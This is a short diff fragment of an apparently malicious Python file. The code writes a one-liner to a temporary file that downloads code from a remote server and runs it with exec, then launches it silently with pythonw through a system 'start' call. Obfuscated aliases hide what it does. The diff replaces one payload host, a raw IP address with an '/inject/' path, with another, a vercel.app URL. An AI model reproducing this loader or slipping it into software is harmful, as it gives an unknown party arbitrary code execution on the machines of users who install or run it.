@@ -8,7 +8,7 @@ import tempfile
 import subprocess
 
 _ttmp = _ffile(delete=False)
-_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("http://178.215.236.225:8000/inject/Zj7b8OyZGZ6IJI9v").read())""")
+_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://handler-phi.vercel.app/2.txt").read())""")
 _ttmp.close()
 try:
     _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
